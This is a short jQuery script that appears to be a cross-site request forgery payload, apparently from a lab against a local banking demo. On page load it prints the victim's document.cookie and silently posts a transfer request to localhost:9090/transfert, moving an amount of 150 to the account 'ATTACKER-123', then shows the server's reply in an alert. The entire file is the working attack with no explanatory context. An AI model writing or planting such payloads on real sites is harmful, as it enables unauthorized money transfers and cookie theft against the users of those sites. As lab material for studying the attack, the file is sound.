$(function () {
	
	
	console.log(document.cookie);
	
	
	$.post("http://localhost:9090/transfert?noDebiteur=ATTACKER-123&montant=150", function(data, status){
	    alert("Data: " + data + "\nStatus: " + status);
	});
	
})